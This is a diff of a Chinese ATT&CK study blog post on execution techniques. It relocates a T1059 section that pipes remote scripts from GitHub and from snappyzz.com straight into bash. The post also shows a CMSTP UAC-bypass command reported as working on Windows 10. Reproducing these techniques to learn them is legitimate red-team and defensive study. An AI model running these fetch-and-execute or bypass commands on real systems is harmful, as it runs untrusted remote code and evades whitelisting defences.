@@ -5,6 +5,17 @@ excerpt: "跟着ATT&CK学安全之execution"
 categories: [ATT&CK]
 comments: true
 ---
+
+### T1059 - Command-Line Interface
+这个没什么好说的,就是一个命令行运行文件
+
+平台:Linux,运行如下命令
+```bash
+bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
+或者
+bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
+```
+成功复现
 #### T1191 - CMSTP
 Microsoft Connection Manager Profile Installer (CMSTP.exe)是一个安装连接管理配置的应用程序.它允许接受一个INF文件作为参数,安装一个服务,来进行远程连接.红队可用CMSTP.exe和inf文件来生成恶意命令.CMSTP.exe现在拒绝从远程加载dll,但由于CMSTP.exe是一个合法的程序,且有微软的签名,这个运行仍然可以绕过基于白名单和AppLocker的防御.
 
@@ -24,16 +35,7 @@ window10运行成功
 cmstp.exe /s T1191_uacbypass.inf /au
 ```
 window10运行成功
-#### T1059 - Command-Line Interface
-这个没什么好说的,就是一个命令行运行文件
 
-平台:Linux,运行如下命令
-```bash
-bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-或者
-bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
-```
-centos上运行成功
 
 
 #### T1173 - Dynamic Data Exchange
